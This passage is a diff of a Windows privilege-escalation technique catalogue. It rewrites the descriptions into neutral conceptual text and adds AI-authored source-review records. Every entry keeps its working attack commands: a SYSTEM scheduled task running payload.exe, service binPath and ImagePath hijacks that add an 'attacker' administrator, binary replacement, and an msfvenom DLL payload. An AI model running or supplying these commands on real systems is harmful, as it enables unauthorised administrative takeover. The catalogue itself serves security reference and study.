+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual claims about execution identities, processor modes, and task/startup permissions. Excludes commands, tools, prerequisites, applicability, connection outcomes, route viability, and ATT&CK mappings. Navigation labels remain project conventions.",
+      "reviewedContent": {
+        "affects": "All supported Windows versions.",
+        "commands": [
+          {
+            "code": "schtasks /create /tn sysT /tr \"C:\\Temp\\payload.exe\" /sc once /st 00:00 /ru SYSTEM /f\nschtasks /run /tn sysT",
+            "label": "Create + run a SYSTEM task",
+            "lang": "cmd"
+          }
+        ],
+        "description": "A scheduled task has a security context associated with an account or group. LocalSystem is one Windows account identity, with extensive privileges on the local computer, and is separate from a logged-on user's account. The task's configured identity describes its execution context; the Task Scheduler label alone does not identify that account.",
+        "id": "pe-admin-schtask-system",
+        "label": "Scheduled Task as SYSTEM",
+        "mitre": {
+          "id": "T1053.005",
+          "url": "https://attack.mitre.org/techniques/T1053/005/"
+        },
+        "opsec": "Task creation (Event ID 4698) with a SYSTEM principal is a strong signal.",
+        "phase": "admin",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Microsoft, Security Contexts for Tasks",
+            "section": "Opening context definition; Specifying Credentials; task permissions",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks"
+          },
+          {
+            "kind": "primary",
+            "label": "Microsoft, LocalSystem Account",
+            "section": "Opening account definition",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account"
+          }
+        ],
+        "requires": [
+          "High-integrity administrator context"
+        ],
+        "summary": "Understand LocalSystem as a scheduled task's execution identity.",
+        "tools": [
+          {
+            "name": "schtasks (built-in)",
+            "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks"
+          }
+        ]
+      },
+      "claims": [
+        {
+          "text": "A scheduled task has a security context associated with the account or group specified for it.",
+          "section": "Microsoft, Security Contexts for Tasks — Specifying Credentials",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks"
+          ]
+        },
+        {
+          "text": "LocalSystem has extensive local privileges and is not associated with a logged-on user account.",
+          "section": "Microsoft, LocalSystem Account — Opening account definition",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account"
+          ]
+        }
+      ]
+    }
   },
   {
     id: 'pe-admin-token',
@@ -812,98 +3163,627 @@ reg save HKLM\SYSTEM C:\Temp\system.hive`, lang: 'cmd' },
 
   // ── Service Misconfigurations ───────────────────────────────────────────────
   {
-    id: 'pe-unquoted-service-path',
-    label: 'Unquoted Service Path',
-    phase: 'finding',
-    summary: 'Plant a binary along an unquoted, space-containing service path.',
-    affects: 'All supported Windows versions (configuration weakness).',
-    description: r`When a service ImagePath contains spaces and is not wrapped in quotes (e.g. C:\Program Files\My App\svc.exe), Windows tries each space-delimited prefix as an executable: C:\Program.exe, then C:\Program Files\My.exe, and so on. If you can write to one of those intermediate directories, drop a malicious binary there and it runs as the service account on next start.`,
-    tools: [
-      { name: 'WinPEAS', url: 'https://github.com/peass-ng/PEASS-ng' },
-      { name: 'PowerUp', url: 'https://github.com/PowerShellMafia/PowerSploit' },
+    "id": "pe-unquoted-service-path",
+    "label": "Unquoted Service Path",
+    "phase": "finding",
+    "summary": "Understand service startup configuration and executable-path records.",
+    "affects": "All supported Windows versions (configuration weakness).",
+    "description": "Windows uses service configuration to determine how a service starts. The Service Control Manager maintains installed-service records that include the executable path and other startup information. Understanding the stored path begins with distinguishing service configuration from the executable file it names.",
+    "tools": [
+      {
+        "name": "WinPEAS",
+        "url": "https://github.com/peass-ng/PEASS-ng"
+      },
+      {
+        "name": "PowerUp",
+        "url": "https://github.com/PowerShellMafia/PowerSploit"
+      }
     ],
-    commands: [
-      { label: 'Find unquoted paths with spaces', code: r`Get-WmiObject win32_service | ? { $_.PathName -notlike '"*' -and $_.PathName -like '* *' } | select Name, PathName`, lang: 'powershell' },
-      { label: 'Restart the service to trigger (sc stop is async and returns before STOPPED, so the start can race error 1061; poll or wait, e.g. sc query ... | findstr STOPPED, or rely on the auto-start-on-reboot path)', code: r`sc stop <service> & sc query <service> | findstr STOPPED & sc start <service>`, lang: 'cmd' },
+    "commands": [
+      {
+        "label": "Find unquoted paths with spaces",
+        "code": "Get-WmiObject win32_service | ? { $_.PathName -notlike '\"*' -and $_.PathName -like '* *' } | select Name, PathName",
+        "lang": "powershell"
+      },
+      {
+        "label": "Restart the service to trigger (sc stop is async and returns before STOPPED, so the start can race error 1061; poll or wait, e.g. sc query ... | findstr STOPPED, or rely on the auto-start-on-reboot path)",
+        "code": "sc stop <service> & sc query <service> | findstr STOPPED & sc start <service>",
+        "lang": "cmd"
+      }
     ],
-    mitre: mitre('T1574.009'),
-    requires: ['Service with an unquoted path + space', 'Write access to an intermediate directory', 'Ability to restart the service or reboot'],
-    opsec: 'A new EXE in an unusual path + service crash/restart events are detectable. The service runs your binary as its (often SYSTEM) account.',
+    "mitre": {
+      "id": "T1574.009",
+      "url": "https://attack.mitre.org/techniques/T1574/009/"
+    },
+    "requires": [
+      "Service with an unquoted path + space",
+      "Write access to an intermediate directory",
+      "Ability to restart the service or reboot"
+    ],
+    "opsec": "A new EXE in an unusual path + service crash/restart events are detectable. The service runs your binary as its (often SYSTEM) account.",
+    "references": [
+      {
+        "label": "Microsoft — Service Configuration",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/services/service-configuration",
+        "kind": "primary"
+      },
+      {
+        "label": "Microsoft — Database of Installed Services",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/services/database-of-installed-services",
+        "kind": "primary"
+      }
+    ],
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected foundational definitions of authentication, Windows management, service configuration and securable objects. These sources support only the listed conceptual claims. Excludes technique mechanics, commands, tools, prerequisites, applicability, version or algorithm details, connection outcomes, attack-path viability and ATT&CK mappings. Navigation labels remain project conventions.",
+      "reviewedContent": {
+        "affects": "All supported Windows versions (configuration weakness).",
+        "commands": [
+          {
+            "code": "Get-WmiObject win32_service | ? { $_.PathName -notlike '\"*' -and $_.PathName -like '* *' } | select Name, PathName",
+            "label": "Find unquoted paths with spaces",
+            "lang": "powershell"
+          },
+          {
+            "code": "sc stop <service> & sc query <service> | findstr STOPPED & sc start <service>",
+            "label": "Restart the service to trigger (sc stop is async and returns before STOPPED, so the start can race error 1061; poll or wait, e.g. sc query ... | findstr STOPPED, or rely on the auto-start-on-reboot path)",
+            "lang": "cmd"
+          }
+        ],
+        "description": "Windows uses service configuration to determine how a service starts. The Service Control Manager maintains installed-service records that include the executable path and other startup information. Understanding the stored path begins with distinguishing service configuration from the executable file it names.",
+        "id": "pe-unquoted-service-path",
+        "label": "Unquoted Service Path",
+        "mitre": {
+          "id": "T1574.009",
+          "url": "https://attack.mitre.org/techniques/T1574/009/"
+        },
+        "opsec": "A new EXE in an unusual path + service crash/restart events are detectable. The service runs your binary as its (often SYSTEM) account.",
+        "phase": "finding",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Microsoft — Service Configuration",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/services/service-configuration"
+          },
+          {
+            "kind": "primary",
+            "label": "Microsoft — Database of Installed Services",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/services/database-of-installed-services"
+          }
+        ],
+        "requires": [
+          "Service with an unquoted path + space",
+          "Write access to an intermediate directory",
+          "Ability to restart the service or reboot"
+        ],
+        "summary": "Understand service startup configuration and executable-path records.",
+        "tools": [
+          {
+            "name": "WinPEAS",
+            "url": "https://github.com/peass-ng/PEASS-ng"
+          },
+          {
+            "name": "PowerUp",
+            "url": "https://github.com/PowerShellMafia/PowerSploit"
+          }
+        ]
+      },
+      "claims": [
+        {
+          "text": "Windows uses service configuration information to determine how to start a service.",
+          "section": "Microsoft — Service Configuration — Opening configuration definition",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/services/service-configuration"
+          ]
+        },
+        {
+          "text": "The Service Control Manager's installed-service database includes the fully qualified executable path.",
+          "section": "Microsoft — Database of Installed Services — Installed-service information: executable-path item",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/services/database-of-installed-services"
+          ]
+        }
+      ]
+    }
   },
   {
-    id: 'pe-weak-service-perms',
-    label: 'Weak Service Permissions (binPath)',
-    phase: 'finding',
-    summary: 'Reconfigure a modifiable service binPath to your command.',
-    affects: 'All supported Windows versions (configuration weakness).',
-    description: r`If your user holds SERVICE_CHANGE_CONFIG (or SERVICE_ALL_ACCESS) on a SYSTEM service, rewrite its binPath to an arbitrary command, then restart it. The Service Control Manager launches your command as the service account (typically LocalSystem). Find these with accesschk or SharpUp.`,
-    tools: [
-      { name: 'SharpUp', url: 'https://github.com/GhostPack/SharpUp' },
-      { name: 'accesschk (Sysinternals)', url: 'https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk' },
+    "id": "pe-weak-service-perms",
+    "label": "Weak Service Permissions (binPath)",
+    "phase": "finding",
+    "summary": "Distinguish access to service objects from access to files.",
+    "affects": "All supported Windows versions (configuration weakness).",
+    "description": "The Windows access-control model governs access to the Service Control Manager and individual service objects. Files are also securable objects with their own security descriptors. A service object and its executable file are separate objects when describing permissions.",
+    "tools": [
+      {
+        "name": "SharpUp",
+        "url": "https://github.com/GhostPack/SharpUp"
+      },
+      {
+        "name": "accesschk (Sysinternals)",
+        "url": "https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk"
+      }
     ],
-    commands: [
-      { label: 'Enumerate modifiable services', code: r`accesschk.exe -uwcqv "Users" * /accepteula`, lang: 'cmd' },
-      { label: "Hijack binPath (note the space after '=')", code: r`sc config <service> binpath= "net localgroup administrators attacker /add"`, lang: 'cmd' },
-      { label: 'Trigger', code: r`sc stop <service> & sc start <service>`, lang: 'cmd' },
+    "commands": [
+      {
+        "label": "Enumerate modifiable services",
+        "code": "accesschk.exe -uwcqv \"Users\" * /accepteula",
+        "lang": "cmd"
+      },
+      {
+        "label": "Hijack binPath (note the space after '=')",
+        "code": "sc config <service> binpath= \"net localgroup administrators attacker /add\"",
+        "lang": "cmd"
+      },
+      {
+        "label": "Trigger",
+        "code": "sc stop <service> & sc start <service>",
+        "lang": "cmd"
+      }
     ],
-    mitre: mitre('T1543.003'),
-    requires: ['SERVICE_CHANGE_CONFIG / SERVICE_ALL_ACCESS on a privileged service', 'Ability to start/stop it'],
-    opsec: 'sc config changes and the service failing to return a control response are logged. The command still executes before the SCM errors out.',
+    "mitre": {
+      "id": "T1543.003",
+      "url": "https://attack.mitre.org/techniques/T1543/003/"
+    },
+    "requires": [
+      "SERVICE_CHANGE_CONFIG / SERVICE_ALL_ACCESS on a privileged service",
+      "Ability to start/stop it"
+    ],
+    "opsec": "sc config changes and the service failing to return a control response are logged. The command still executes before the SCM errors out.",
+    "references": [
+      {
+        "label": "Microsoft — Service Security and Access Rights",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights",
+        "kind": "primary"
+      },
+      {
+        "label": "Microsoft — File Security and Access Rights",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/fileio/file-security-and-access-rights",
+        "kind": "primary"
+      }
+    ],
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected foundational definitions of authentication, Windows management, service configuration and securable objects. These sources support only the listed conceptual claims. Excludes technique mechanics, commands, tools, prerequisites, applicability, version or algorithm details, connection outcomes, attack-path viability and ATT&CK mappings. Navigation labels remain project conventions.",
+      "reviewedContent": {
+        "affects": "All supported Windows versions (configuration weakness).",
+        "commands": [
+          {
+            "code": "accesschk.exe -uwcqv \"Users\" * /accepteula",
+            "label": "Enumerate modifiable services",
+            "lang": "cmd"
+          },
+          {
+            "code": "sc config <service> binpath= \"net localgroup administrators attacker /add\"",
+            "label": "Hijack binPath (note the space after '=')",
+            "lang": "cmd"
+          },
+          {
+            "code": "sc stop <service> & sc start <service>",
+            "label": "Trigger",
+            "lang": "cmd"
+          }
+        ],
+        "description": "The Windows access-control model governs access to the Service Control Manager and individual service objects. Files are also securable objects with their own security descriptors. A service object and its executable file are separate objects when describing permissions.",
+        "id": "pe-weak-service-perms",
+        "label": "Weak Service Permissions (binPath)",
+        "mitre": {
+          "id": "T1543.003",
+          "url": "https://attack.mitre.org/techniques/T1543/003/"
+        },
+        "opsec": "sc config changes and the service failing to return a control response are logged. The command still executes before the SCM errors out.",
+        "phase": "finding",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Microsoft — Service Security and Access Rights",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights"
+          },
+          {
+            "kind": "primary",
+            "label": "Microsoft — File Security and Access Rights",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/fileio/file-security-and-access-rights"
+          }
+        ],
+        "requires": [
+          "SERVICE_CHANGE_CONFIG / SERVICE_ALL_ACCESS on a privileged service",
+          "Ability to start/stop it"
+        ],
+        "summary": "Distinguish access to service objects from access to files.",
+        "tools": [
+          {
+            "name": "SharpUp",
+            "url": "https://github.com/GhostPack/SharpUp"
+          },
+          {
+            "name": "accesschk (Sysinternals)",
+            "url": "https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk"
+          }
+        ]
+      },
+      "claims": [
+        {
+          "text": "Windows access control applies to the Service Control Manager and service objects.",
+          "section": "Microsoft — Service Security and Access Rights — Opening access-control definition",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights"
+          ]
+        },
+        {
+          "text": "Files are securable objects whose access is governed by Windows access control and security descriptors.",
+          "section": "Microsoft — File Security and Access Rights — Opening definition; Security descriptors",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/fileio/file-security-and-access-rights"
+          ]
+        }
+      ]
+    }
   },
   {
-    id: 'pe-insecure-service-binary',
-    label: 'Writable Service Binary',
-    phase: 'finding',
-    summary: 'Overwrite a service EXE you can write to.',
-    affects: 'All supported Windows versions (configuration weakness).',
-    description: r`If the on-disk service executable (or its containing folder) is writable by your user but the service runs as SYSTEM, replace the binary with your payload and restart the service. Distinct from binPath abuse: here the misconfiguration is filesystem ACLs on the EXE rather than the service config.`,
-    tools: [
-      { name: 'accesschk (Sysinternals)', url: 'https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk' },
-      { name: 'PowerUp', url: 'https://github.com/PowerShellMafia/PowerSploit' },
+    "id": "pe-insecure-service-binary",
+    "label": "Writable Service Binary",
+    "phase": "finding",
+    "summary": "Distinguish executable-file access from a service's account identity.",
+    "affects": "All supported Windows versions (configuration weakness).",
+    "description": "Windows regulates access to files through its access-control model. Separately, each service runs in an account's security context. The permissions on an executable file and the identity of the process using it describe different parts of the security model.",
+    "tools": [
+      {
+        "name": "accesschk (Sysinternals)",
+        "url": "https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk"
+      },
+      {
+        "name": "PowerUp",
+        "url": "https://github.com/PowerShellMafia/PowerSploit"
+      }
     ],
-    commands: [
-      { label: 'Check write access to a service binary', code: r`accesschk.exe -quvw "Users" "C:\Path\To\service.exe" /accepteula`, lang: 'cmd' },
-      { label: 'Stop, replace, restart (running service locks its EXE)', code: r`sc stop <service> & copy /y payload.exe "C:\Path\To\service.exe" & sc start <service>`, lang: 'cmd' },
+    "commands": [
+      {
+        "label": "Check write access to a service binary",
+        "code": "accesschk.exe -quvw \"Users\" \"C:\\Path\\To\\service.exe\" /accepteula",
+        "lang": "cmd"
+      },
+      {
+        "label": "Stop, replace, restart (running service locks its EXE)",
+        "code": "sc stop <service> & copy /y payload.exe \"C:\\Path\\To\\service.exe\" & sc start <service>",
+        "lang": "cmd"
+      }
     ],
-    mitre: mitre('T1574.010'),
-    requires: ['Write/modify permission on the service EXE or its directory', 'Service runs as SYSTEM/elevated', 'Ability to restart it'],
-    opsec: 'File-modification + service-restart events. Back up the original binary to restore the service afterward.',
+    "mitre": {
+      "id": "T1574.010",
+      "url": "https://attack.mitre.org/techniques/T1574/010/"
+    },
+    "requires": [
+      "Write/modify permission on the service EXE or its directory",
+      "Service runs as SYSTEM/elevated",
+      "Ability to restart it"
+    ],
+    "opsec": "File-modification + service-restart events. Back up the original binary to restore the service afterward.",
+    "references": [
+      {
+        "label": "Microsoft — File Security and Access Rights",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/fileio/file-security-and-access-rights",
+        "kind": "primary"
+      },
+      {
+        "label": "Microsoft — Service User Accounts",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/services/service-user-accounts",
+        "kind": "primary"
+      }
+    ],
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected foundational definitions of authentication, Windows management, service configuration and securable objects. These sources support only the listed conceptual claims. Excludes technique mechanics, commands, tools, prerequisites, applicability, version or algorithm details, connection outcomes, attack-path viability and ATT&CK mappings. Navigation labels remain project conventions.",
+      "reviewedContent": {
+        "affects": "All supported Windows versions (configuration weakness).",
+        "commands": [
+          {
+            "code": "accesschk.exe -quvw \"Users\" \"C:\\Path\\To\\service.exe\" /accepteula",
+            "label": "Check write access to a service binary",
+            "lang": "cmd"
+          },
+          {
+            "code": "sc stop <service> & copy /y payload.exe \"C:\\Path\\To\\service.exe\" & sc start <service>",
+            "label": "Stop, replace, restart (running service locks its EXE)",
+            "lang": "cmd"
+          }
+        ],
+        "description": "Windows regulates access to files through its access-control model. Separately, each service runs in an account's security context. The permissions on an executable file and the identity of the process using it describe different parts of the security model.",
+        "id": "pe-insecure-service-binary",
+        "label": "Writable Service Binary",
+        "mitre": {
+          "id": "T1574.010",
+          "url": "https://attack.mitre.org/techniques/T1574/010/"
+        },
+        "opsec": "File-modification + service-restart events. Back up the original binary to restore the service afterward.",
+        "phase": "finding",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Microsoft — File Security and Access Rights",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/fileio/file-security-and-access-rights"
+          },
+          {
+            "kind": "primary",
+            "label": "Microsoft — Service User Accounts",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/services/service-user-accounts"
+          }
+        ],
+        "requires": [
+          "Write/modify permission on the service EXE or its directory",
+          "Service runs as SYSTEM/elevated",
+          "Ability to restart it"
+        ],
+        "summary": "Distinguish executable-file access from a service's account identity.",
+        "tools": [
+          {
+            "name": "accesschk (Sysinternals)",
+            "url": "https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk"
+          },
+          {
+            "name": "PowerUp",
+            "url": "https://github.com/PowerShellMafia/PowerSploit"
+          }
+        ]
+      },
+      "claims": [
+        {
+          "text": "Windows treats files as securable objects subject to its access-control model.",
+          "section": "Microsoft — File Security and Access Rights — Opening file-security definition",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/fileio/file-security-and-access-rights"
+          ]
+        },
+        {
+          "text": "Each Windows service runs in the security context of an account.",
+          "section": "Microsoft — Service User Accounts — Opening service-account definition",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/services/service-user-accounts"
+          ]
+        }
+      ]
+    }
   },
   {
-    id: 'pe-weak-registry-service',
-    label: 'Weak Service Registry Perms',
-    phase: 'finding',
-    summary: 'Rewrite a service ImagePath via a writable registry key.',
-    affects: 'All supported Windows versions (configuration weakness).',
-    description: r`If your user can write to a service key under HKLM\SYSTEM\CurrentControlSet\Services (even without service-config rights via the SCM), modify the ImagePath value to point at your binary. On next start the service launches your executable as its configured account (SYSTEM only if the service runs as LocalSystem; check ObjectName before targeting). Enumerate writable service keys with accesschk -k.`,
-    tools: [{ name: 'accesschk (Sysinternals)', url: 'https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk' }],
-    commands: [
-      { label: 'Find writable service keys', code: r`accesschk.exe -kvuqsw hklm\System\CurrentControlSet\Services /accepteula`, lang: 'cmd' },
-      { label: 'Overwrite ImagePath', code: r`reg add HKLM\SYSTEM\CurrentControlSet\Services\<svc> /v ImagePath /t REG_EXPAND_SZ /d "C:\Temp\payload.exe" /f`, lang: 'cmd' },
+    "id": "pe-weak-registry-service",
+    "label": "Weak Service Registry Perms",
+    "phase": "finding",
+    "summary": "Understand registry access control and installed-service records.",
+    "affects": "All supported Windows versions (configuration weakness).",
+    "description": "Registry keys have security descriptors and access rights in the Windows security model. The Service Control Manager stores its installed-service database in the registry. Registry permissions describe access to stored configuration; the service database describes the installed services.",
+    "tools": [
+      {
+        "name": "accesschk (Sysinternals)",
+        "url": "https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk"
+      }
     ],
-    mitre: mitre('T1574.011'),
-    requires: ['Write access to a service registry key', 'Ability to restart the service or reboot'],
-    opsec: 'Registry modification of ImagePath on a service key is a high-fidelity detection: the write event is logged the moment it happens (Sysmon Event ID 13, Security 4657) regardless of any later reversion. Restore the value afterward for operational cleanup and to avoid breaking the service, not to evade detection (restoring only adds a second change event).',
+    "commands": [
+      {
+        "label": "Find writable service keys",
+        "code": "accesschk.exe -kvuqsw hklm\\System\\CurrentControlSet\\Services /accepteula",
+        "lang": "cmd"
+      },
+      {
+        "label": "Overwrite ImagePath",
+        "code": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\<svc> /v ImagePath /t REG_EXPAND_SZ /d \"C:\\Temp\\payload.exe\" /f",
+        "lang": "cmd"
+      }
+    ],
+    "mitre": {
+      "id": "T1574.011",
+      "url": "https://attack.mitre.org/techniques/T1574/011/"
+    },
+    "requires": [
+      "Write access to a service registry key",
+      "Ability to restart the service or reboot"
+    ],
+    "opsec": "Registry modification of ImagePath on a service key is a high-fidelity detection: the write event is logged the moment it happens (Sysmon Event ID 13, Security 4657) regardless of any later reversion. Restore the value afterward for operational cleanup and to avoid breaking the service, not to evade detection (restoring only adds a second change event).",
+    "references": [
+      {
+        "label": "Microsoft — Registry Key Security and Access Rights",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights",
+        "kind": "primary"
+      },
+      {
+        "label": "Microsoft — Database of Installed Services",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/services/database-of-installed-services",
+        "kind": "primary"
+      }
+    ],
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected foundational definitions of authentication, Windows management, service configuration and securable objects. These sources support only the listed conceptual claims. Excludes technique mechanics, commands, tools, prerequisites, applicability, version or algorithm details, connection outcomes, attack-path viability and ATT&CK mappings. Navigation labels remain project conventions.",
+      "reviewedContent": {
+        "affects": "All supported Windows versions (configuration weakness).",
+        "commands": [
+          {
+            "code": "accesschk.exe -kvuqsw hklm\\System\\CurrentControlSet\\Services /accepteula",
+            "label": "Find writable service keys",
+            "lang": "cmd"
+          },
+          {
+            "code": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\<svc> /v ImagePath /t REG_EXPAND_SZ /d \"C:\\Temp\\payload.exe\" /f",
+            "label": "Overwrite ImagePath",
+            "lang": "cmd"
+          }
+        ],
+        "description": "Registry keys have security descriptors and access rights in the Windows security model. The Service Control Manager stores its installed-service database in the registry. Registry permissions describe access to stored configuration; the service database describes the installed services.",
+        "id": "pe-weak-registry-service",
+        "label": "Weak Service Registry Perms",
+        "mitre": {
+          "id": "T1574.011",
+          "url": "https://attack.mitre.org/techniques/T1574/011/"
+        },
+        "opsec": "Registry modification of ImagePath on a service key is a high-fidelity detection: the write event is logged the moment it happens (Sysmon Event ID 13, Security 4657) regardless of any later reversion. Restore the value afterward for operational cleanup and to avoid breaking the service, not to evade detection (restoring only adds a second change event).",
+        "phase": "finding",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Microsoft — Registry Key Security and Access Rights",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights"
+          },
+          {
+            "kind": "primary",
+            "label": "Microsoft — Database of Installed Services",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/services/database-of-installed-services"
+          }
+        ],
+        "requires": [
+          "Write access to a service registry key",
+          "Ability to restart the service or reboot"
+        ],
+        "summary": "Understand registry access control and installed-service records.",
+        "tools": [
+          {
+            "name": "accesschk (Sysinternals)",
+            "url": "https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk"
+          }
+        ]
+      },
+      "claims": [
+        {
+          "text": "Windows controls access to registry keys using security descriptors and access rights.",
+          "section": "Microsoft — Registry Key Security and Access Rights — Opening definition and security-descriptor paragraphs",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights"
+          ]
+        },
+        {
+          "text": "The Service Control Manager maintains its installed-service database in the registry.",
+          "section": "Microsoft — Database of Installed Services — Opening database definition",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/services/database-of-installed-services"
+          ]
+        }
+      ]
+    }
   },
 
   // ── DLL & PATH Hijacking ────────────────────────────────────────────────────
   {
-    id: 'pe-service-dll-hijack',
-    label: 'Service DLL Hijacking',
-    phase: 'finding',
-    summary: 'Plant a DLL a privileged service loads from a writable path.',
-    affects: 'All supported Windows versions (depends on the service).',
-    description: r`A SYSTEM service that searches for a DLL by name and finds it in a writable, earlier search-order location (or a missing 'phantom' DLL) will load attacker code into its process. Identify the missing/hijackable module (e.g. with Process Monitor) and drop a matching DLL whose DllMain runs your payload.`,
-    tools: [
-      { name: 'Process Monitor (Sysinternals)', url: 'https://learn.microsoft.com/en-us/sysinternals/downloads/procmon' },
-      { name: 'msfvenom (Metasploit)', url: 'https://github.com/rapid7/metasploit-framework' },
+    "id": "pe-service-dll-hijack",
+    "label": "Service DLL Hijacking",
+    "phase": "finding",
+    "summary": "Understand how loaded DLLs relate to processes and threads.",
+    "affects": "All supported Windows versions (depends on the service).",
+    "description": "A process is an executing program with one or more threads. A loaded DLL is mapped into the process's virtual address space, and its exported functions run in the context of the calling thread. The library, the process and the thread describe related but distinct parts of program execution.",
+    "tools": [
+      {
+        "name": "Process Monitor (Sysinternals)",
+        "url": "https://learn.microsoft.com/en-us/sysinternals/downloads/procmon"
+      },
+      {
+        "name": "msfvenom (Metasploit)",
+        "url": "https://github.com/rapid7/metasploit-framework"
+      }
     ],
-    commands: [
-      { label: 'Generate an x64 add-admin DLL (EXITFUNC=thread keeps the hijacked service alive)', code: r`msfvenom -p windows/x64/exec CMD='net localgroup administrators attacker /add' EXITFUNC=thread -f dll -o hijack.dll`, lang: 'bash' },
+    "commands": [
+      {
+        "label": "Generate an x64 add-admin DLL (EXITFUNC=thread keeps the hijacked service alive)",
+        "code": "msfvenom -p windows/x64/exec CMD='net localgroup administrators attacker /add' EXITFUNC=thread -f dll -o hijack.dll",
+        "lang": "bash"
+      }
     ],
-    mitre: mitre('T1574.001'),
-    requires: ['Privileged service that loads a DLL from a writable / missing path', 'Ability to restart it'],
-    opsec: 'An unsigned DLL loaded by a signed service binary from a user-writable directory (Sysmon Event ID 7) is a strong detection signal.',
+    "mitre": {
+      "id": "T1574.001",
+      "url": "https://attack.mitre.org/techniques/T1574/001/"
+    },
+    "requires": [
+      "Privileged service that loads a DLL from a writable / missing path",
+      "Ability to restart it"
+    ],
+    "opsec": "An unsigned DLL loaded by a signed service binary from a user-writable directory (Sysmon Event ID 7) is a strong detection signal.",
+    "references": [
+      {
+        "label": "Microsoft — Processes and Threads",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/procthread/processes-and-threads",
+        "kind": "primary"
+      },
+      {
+        "label": "Microsoft — About Dynamic-Link Libraries",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/dlls/about-dynamic-link-libraries",
+        "kind": "primary"
+      }
+    ],
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected foundational definitions of authentication, Windows management, service configuration and securable objects. These sources support only the listed conceptual claims. Excludes technique mechanics, commands, tools, prerequisites, applicability, version or algorithm details, connection outcomes, attack-path viability and ATT&CK mappings. Navigation labels remain project conventions.",
+      "reviewedContent": {
+        "affects": "All supported Windows versions (depends on the service).",
+        "commands": [
+          {
+            "code": "msfvenom -p windows/x64/exec CMD='net localgroup administrators attacker /add' EXITFUNC=thread -f dll -o hijack.dll",
+            "label": "Generate an x64 add-admin DLL (EXITFUNC=thread keeps the hijacked service alive)",
+            "lang": "bash"
+          }
+        ],
+        "description": "A process is an executing program with one or more threads. A loaded DLL is mapped into the process's virtual address space, and its exported functions run in the context of the calling thread. The library, the process and the thread describe related but distinct parts of program execution.",
+        "id": "pe-service-dll-hijack",
+        "label": "Service DLL Hijacking",
+        "mitre": {
+          "id": "T1574.001",
+          "url": "https://attack.mitre.org/techniques/T1574/001/"
+        },
+        "opsec": "An unsigned DLL loaded by a signed service binary from a user-writable directory (Sysmon Event ID 7) is a strong detection signal.",
+        "phase": "finding",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Microsoft — Processes and Threads",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/procthread/processes-and-threads"
+          },
+          {
+            "kind": "primary",
+            "label": "Microsoft — About Dynamic-Link Libraries",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/dlls/about-dynamic-link-libraries"
+          }
+        ],
+        "requires": [
+          "Privileged service that loads a DLL from a writable / missing path",
+          "Ability to restart it"
+        ],
+        "summary": "Understand how loaded DLLs relate to processes and threads.",
+        "tools": [
+          {
+            "name": "Process Monitor (Sysinternals)",
+            "url": "https://learn.microsoft.com/en-us/sysinternals/downloads/procmon"
+          },
+          {
